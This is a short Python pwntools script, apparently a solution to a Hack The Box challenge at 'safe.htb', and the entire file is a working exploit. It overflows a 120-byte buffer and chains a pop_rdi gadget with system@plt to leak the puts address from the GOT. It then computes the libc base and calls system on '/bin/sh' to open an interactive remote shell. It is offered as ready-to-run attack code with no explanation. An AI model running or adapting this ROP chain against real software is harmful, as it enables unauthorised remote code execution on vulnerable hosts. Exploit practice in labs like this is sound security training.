#!/usr/bin/python3
from pwn import remote, p64, u64

shell = remote("safe.htb", 1337)

offset = 120
junk = b"A" * offset

got_puts = p64(0x404018)
pop_rdi = p64(0x000000000040120b)
plt_system = p64(0x0000000000401040)
main = p64(0x000000000040115f)

payload =  b""
payload += junk
payload += pop_rdi + got_puts
payload += plt_system
payload += main

shell.recvline()
shell.sendline(payload)

leaked_puts = u64(shell.recvline().strip()[7:-11].ljust(8,b"\x00"))
libc_base = leaked_puts - 0x68f90

bin_sh = p64(libc_base + 0x161c19)

payload  = b""
payload += junk
payload += pop_rdi + bin_sh
payload += plt_system

shell.recvline()
shell.sendline(payload)
shell.interactive()
